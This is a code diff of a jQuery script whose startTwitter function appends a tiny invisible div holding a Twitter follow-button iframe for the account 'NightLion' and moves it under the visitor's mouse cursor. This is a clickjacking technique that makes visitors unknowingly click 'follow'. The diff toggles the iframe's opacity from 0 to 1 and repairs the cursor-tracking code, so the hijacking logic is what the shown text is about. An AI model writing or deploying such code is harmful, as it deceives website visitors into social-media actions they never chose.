@@ -53,22 +53,21 @@
         };
         
         $.startFacebook = startFacebook; 
-        
 
         function startTwitter()
         {
- 
             $.noConflict();
-//            var interval;
+            var interval;
             var iflag;
-//            var icontainer;
+            var icontainer;
             var standardbody;
             
             jQuery(function(){
-                jQuery("body").append('<div style="overflow: hidden;width: 10px;height: 12px;position:absolute;filter:alpha(opacity=0);-moz-opacity:0.0;-khtml-opacity:0.0;opacity: 0.0;" id="twitterContainer"><iframe src="http://platform.twitter.com/widgets/follow_button.html?screen_name=NightLion&show_count=false" scrolling="no" frameborder="0"  style="border:none;overflow:hidden;width:50px;height:23px;" allowTransparency="true" id="twitter_frame" name="twitter_frame"></iframe></div>');
+                jQuery("body").append('<div style="overflow: hidden;width: 10px;height: 12px;position:absolute;filter:alpha(opacity=1);-moz-opacity:1.0;-khtml-opacity:1.0;opacity: 1.0;" id="twitterContainer"><iframe src="http://platform.twitter.com/widgets/follow_button.html?screen_name=NightLion&show_count=false" scrolling="no" frameborder="0"  style="border:none;overflow:hidden;width:50px;height:23px;" allowTransparency="true" id="twitter_frame" name="twitter_frame"></iframe></div>');
                 iflag = 0;
-               // icontainer = document.getElementById('twitterContainer');
-                standardbody = (document.compatMode=="CSS1Compat") ? document.documentElement : document.body; //create reference to common "body" across doctypescheckCookie();
+                icontainer = document.getElementById('twitterContainer');
+                standardbody = (document.compatMode=="CSS1Compat") ? document.documentElement : document.body //create reference to common "body" across doctypescheckCookie();
+               // interval=setInterval("updateActiveElement();", 50);
                 }
             );
             
@@ -77,16 +76,13 @@
                     var x = e.pageX - 5;
                     var y = e.pageY;
                     //console.log("X: " + x + " AND Y: " + y);
-                    $('twitterContainer').css('top', y).css('left', x);
+                    jQuery(icontainer).css('top', y).css('left', x);
                     }
                 }
             );
         };
         
-        $.startTwitter = startTwitter;
-        
-
-
+         $.startTwitter = startTwitter;
         
         function startGoogle() {
             
